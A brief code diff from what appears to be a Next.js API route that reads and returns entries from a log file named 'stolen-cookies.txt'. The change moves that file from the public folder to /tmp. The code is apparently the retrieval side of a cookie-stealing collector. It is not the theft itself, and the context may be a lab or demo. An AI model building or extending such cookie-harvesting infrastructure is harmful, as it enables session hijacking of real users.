@@ -6,7 +6,8 @@ type Entry = { time: string; name: string; cookie: unknown };
 
 export async function GET() {
   try {
-    const logPath = path.join(process.cwd(), "public/stolen-cookies.txt");
+    // const logPath = path.join(process.cwd(), "public/stolen-cookies.txt");
+    const logPath = path.join("/tmp", "stolen-cookies.txt");
 
     if (!fs.existsSync(logPath)) {
       return NextResponse.json({ data: [] });
